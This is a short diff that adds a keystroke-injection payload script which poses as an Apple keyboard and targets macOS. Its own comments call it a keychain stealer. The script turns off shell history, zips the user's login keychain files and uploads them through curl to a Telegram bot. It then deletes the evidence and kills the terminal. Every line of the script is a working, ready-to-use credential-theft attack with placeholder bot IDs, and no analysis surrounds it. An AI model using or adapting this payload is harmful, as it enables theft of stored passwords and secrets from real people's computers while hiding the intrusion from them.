@@ -1,0 +1,28 @@
+ID 05ac:021e Apple:Keyboard
+
+REM Author: sud0cat
+REM Description: Keychain stealer that sends exfiltrated data to Telegram
+REM Target: macOS
+
+DEFAULT_DELAY 500
+
+REM Open the terminal
+F4
+STRING Terminal
+ENTER
+
+REM Disable shell history
+STRING unset HISTFILE
+ENTER
+
+REM Gather keychain data
+STRING nohup bash -c cd ~/Library/Keychains/ && zip login.zip login.keychain* 
+ENTER
+
+REM Send files to Telegram channel + remove trace
+STRING curl -v -F "chat_id=<your_chat_id>" -F document=@login.zip https://api.telegram.org/bot<your_bot_id>/sendDocument && rm login.zip nohup.out
+ENTER
+
+REM Quit terminal
+STRING kill -9 $(ps -p $PPID -o ppid=)
+ENTER
